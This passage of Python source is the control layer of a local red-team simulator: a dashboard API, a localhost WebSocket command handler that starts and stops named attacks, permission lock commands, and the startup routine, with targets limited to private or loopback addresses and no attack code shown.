    def __init__(self, orchestrator: AttackOrchestrator):
        self._orch = orchestrator

    def get_state(self) -> str:
        return json.dumps(self._orch.get_state(), default=str)

    def run_attack(self, name: str) -> str:
        def _worker():
            return self._orch.run_attack(name)
        t = threading.Thread(target=_worker, daemon=True)
        t.start()
        return json.dumps({"status": "started", "attack": name})

    def run_scenario(self, name: str) -> str:
        def _worker():
            self._orch.run_scenario(name)
        t = threading.Thread(target=_worker, daemon=True)
        t.start()
        return json.dumps({"status": "started", "scenario": name})

    def stop_attack(self) -> str:
        self._orch.stop()
        return json.dumps({"status": "stopped"})

    def get_scenarios(self) -> str:
        return json.dumps(SCENARIOS)

    def get_attack_list(self) -> str:
        attacks = [
            {
                "name": a.name,
                "target_agent": a.target_agent,
                "description": a.description,
                "risk_level": a.risk_level,
            }
            for a in self._orch.attacks.values()
        ]
        return json.dumps(attacks)

    def check_agents_online(self) -> str:
        snap = self._orch.monitor.snapshot_all()
        return json.dumps(snap, default=str)

    def set_target_ip(self, ip: str) -> str:
        if not self._orch.safety.is_safe_target(ip):
            return json.dumps({"success": False,
                               "error": f"{ip} is not a private/loopback address"})
        self._orch.register_attacks(ip)
        return json.dumps({"success": True, "target_ip": ip})

    def get_results(self) -> str:
        return json.dumps(self._orch.results[-100:], default=str)

    def clear_results(self) -> str:
        self._orch.results.clear()
        self._orch.timeline.clear()
        return json.dumps({"success": True})

    # ── Permission management ────────────────────────────────
    def perm_get_status(self) -> str:
        if self._orch._perm:
            return json.dumps({
                "enabled": self._orch._perm.is_enabled(),
                "locked": self._orch._perm.locked,
                "auth_user": self._orch._auth_user,
            })
        return json.dumps({"enabled": False, "locked": False,
                           "auth_user": None, "note": "permissions module not loaded"})

    def perm_enable(self) -> str:
        if self._orch._perm:
            self._orch._perm.enable()
            return json.dumps({"success": True, "enabled": True})
        return json.dumps({"error": "permissions module not loaded"})

    def perm_authenticate(self, user: str, password: str) -> str:
        if not self._orch._perm:
            return json.dumps({"error": "permissions module not loaded"})
        if self._orch._perm.authenticate(user, password):
            self._orch._auth_user = user
            return json.dumps({"success": True, "user": user})
        return json.dumps({"error": "Authentication failed"})

    def perm_lock(self) -> str:
        if self._orch._perm:
            self._orch._perm.locked = True
            self._orch._auth_user = None
            return json.dumps({"success": True, "locked": True})
        return json.dumps({"error": "permissions module not loaded"})

    def perm_unlock(self, user: str, password: str) -> str:
        if not self._orch._perm:
            return json.dumps({"error": "permissions module not loaded"})
        if self._orch._perm.authenticate(user, password):
            self._orch._perm.locked = False
            self._orch._auth_user = user
            return json.dumps({"success": True, "locked": False, "user": user})
        return json.dumps({"error": "Authentication failed"})


# ═══════════════════════════════════════════════════════════════════════════
# WEBSOCKET SERVER
# ═══════════════════════════════════════════════════════════════════════════

_orchestrator = AttackOrchestrator()
_ws_clients: set = set()


async def handle_ws(websocket, path=None):
    """Handle a WebSocket client connection."""
    _ws_clients.add(websocket)
    logger.info(f"[WS] Client connected ({len(_ws_clients)} total)")
    try:
        async for message in websocket:
            try:
                msg = json.loads(message)
                cmd = msg.get("cmd", "")
                response = _handle_command(cmd, msg)
                await websocket.send(json.dumps(response, default=str))
            except json.JSONDecodeError:
                await websocket.send(json.dumps({"error": "Invalid JSON"}))
    except Exception:
        pass
    finally:
        _ws_clients.discard(websocket)
        logger.info(f"[WS] Client disconnected ({len(_ws_clients)} total)")


def _handle_command(cmd: str, msg: dict) -> dict:
    """Process a WebSocket command and return a response."""
    if cmd == "get_state":
        return _orchestrator.get_state()

    elif cmd == "run_attack":
        name = msg.get("name", "")
        if not name:
            return {"error": "attack name is required"}
        result = _orchestrator.run_attack(name)
        return result

    elif cmd == "run_scenario":
        name = msg.get("name", "")
        if not name:
            return {"error": "scenario name is required"}
        result = _orchestrator.run_scenario(name)
        return result

    elif cmd == "stop":
        _orchestrator.stop()
        return {"success": True, "status": "stopped"}

    elif cmd == "set_target":
        ip = msg.get("ip", "")
        if not _orchestrator.safety.is_safe_target(ip):
            return {"error": f"{ip} is not a private/loopback address"}
        _orchestrator.register_attacks(ip)
        return {"success": True, "target_ip": ip}

    elif cmd == "check_agents":
        snap = _orchestrator.monitor.snapshot_all()
        return {"type": "agents", "agents": snap}

    elif cmd == "get_results":
        limit = msg.get("limit", 50)
        return {"type": "results", "results": _orchestrator.results[-limit:]}

    elif cmd == "clear_results":
        _orchestrator.results.clear()
        _orchestrator.timeline.clear()
        return {"success": True}

    elif cmd == "get_scenarios":
        return {"type": "scenarios", "scenarios": SCENARIOS}

    elif cmd == "get_attacks":
        return {
            "type": "attacks",
            "attacks": [
                {
                    "name": a.name,
                    "target_agent": a.target_agent,
                    "description": a.description,
                    "risk_level": a.risk_level,
                }
                for a in _orchestrator.attacks.values()
            ],
        }

    # ── Permission management commands ──────────────────────────
    elif cmd == "perm_get_status":
        if _orchestrator._perm:
            return {"type": "perm_status",
                    "enabled": _orchestrator._perm.is_enabled(),
                    "locked": _orchestrator._perm.locked,
                    "auth_user": _orchestrator._auth_user}
        return {"type": "perm_status", "enabled": False, "locked": False,
                "auth_user": None, "note": "permissions module not loaded"}

    elif cmd == "perm_enable":
        if _orchestrator._perm:
            _orchestrator._perm.enable()
            return {"success": True, "enabled": True}
        return {"error": "permissions module not loaded"}

    elif cmd == "perm_authenticate":
        user = msg.get("user", "")
        password = msg.get("password", "")
        if not _orchestrator._perm:
            return {"error": "permissions module not loaded"}
        if _orchestrator._perm.authenticate(user, password):
            _orchestrator._auth_user = user
            return {"success": True, "user": user}
        return {"error": "Authentication failed"}

    elif cmd == "perm_lock":
        if _orchestrator._perm:
            _orchestrator._perm.locked = True
            _orchestrator._auth_user = None
            return {"success": True, "locked": True}
        return {"error": "permissions module not loaded"}

    elif cmd == "perm_unlock":
        user = msg.get("user", "")
        password = msg.get("password", "")
        if not _orchestrator._perm:
            return {"error": "permissions module not loaded"}
        if _orchestrator._perm.authenticate(user, password):
            _orchestrator._perm.locked = False
            _orchestrator._auth_user = user
            return {"success": True, "locked": False, "user": user}
        return {"error": "Authentication failed"}

    else:
        return {"error": f"Unknown command: {cmd}"}


async def broadcast_loop():
    """Broadcast state to all connected WebSocket clients every 5 seconds."""
    while True:
        if _ws_clients:
            try:
                state = json.dumps(_orchestrator.get_state(), default=str)
                await asyncio.gather(
                    *[c.send(state) for c in _ws_clients.copy()],
                    return_exceptions=True,
                )
            except Exception:
                pass
        await asyncio.sleep(5)


# ═══════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════

def _start_ws_server():
    """Start the WebSocket server in a background thread."""
    if not HAS_WS:
        logger.warning("[RedTeam] websockets not installed -- WS server disabled")
        return

    def _run():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        async def serve():
            server = await websockets.serve(handle_ws, "localhost", WS_PORT)
            logger.info(f"[RedTeam] WebSocket server on ws://localhost:{WS_PORT}")
            asyncio.ensure_future(broadcast_loop())
            await asyncio.Future()

        try:
            loop.run_until_complete(serve())
        except Exception as e:
            logger.error(f"[RedTeam] WS server error: {e}")

    t = threading.Thread(target=_run, daemon=True)
    t.start()


def main():
    logger.info("=" * 60)
    logger.info("  SentinelOS RedTeam Simulator v%s", VERSION)
    logger.info("  Penetration Testing -- Attack & Measure Defenses")
    logger.info("  WebSocket port: %d", WS_PORT)
    logger.info("  Headless: %s", HEADLESS)
    logger.info("  Scapy available: %s", HAS_SCAPY)
    logger.info("=" * 60)

    # Snapshot agents on startup
    _orchestrator.monitor.snapshot_all()

    if HEADLESS or not HAS_WEBVIEW:
        # Headless mode: run WebSocket server only
        if not HAS_WS:
            logger.error("[RedTeam] websockets required for headless mode")
            sys.exit(1)

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        async def run():
            server = await websockets.serve(handle_ws, "localhost", WS_PORT)
            logger.info(f"[RedTeam] WebSocket server on ws://localhost:{WS_PORT}")
            asyncio.create_task(broadcast_loop())
            await asyncio.Future()

        try:
            loop.run_until_complete(run())
        except KeyboardInterrupt:
            pass
        finally:
            _orchestrator.stop()
            logger.info("[RedTeam] Shutdown complete.")
    else:
        # GUI mode: launch pywebview with the dashboard
        _start_ws_server()

        dashboard_path = os.path.join(REDTEAM_DIR, "redteam_dashboard.html")
        if not os.path.exists(dashboard_path):
            logger.error(f"[RedTeam] Dashboard not found: {dashboard_path}")
            sys.exit(1)

        api = RedTeamAPI(_orchestrator)
        window = webview.create_window(
            "RedTeam Simulator \u2014 Optimus Suite",
            url=dashboard_path,
            js_api=api,
            width=1360,
            height=860,
            background_color="#0f0f13",
            min_size=(1024, 640),
        )
        logger.info("[RedTeam] Launching dashboard window...")
        webview.start(debug=False)

        _orchestrator.stop()
        logger.info("[RedTeam] Shutdown complete.")


if __name__ == "__main__":
    main()
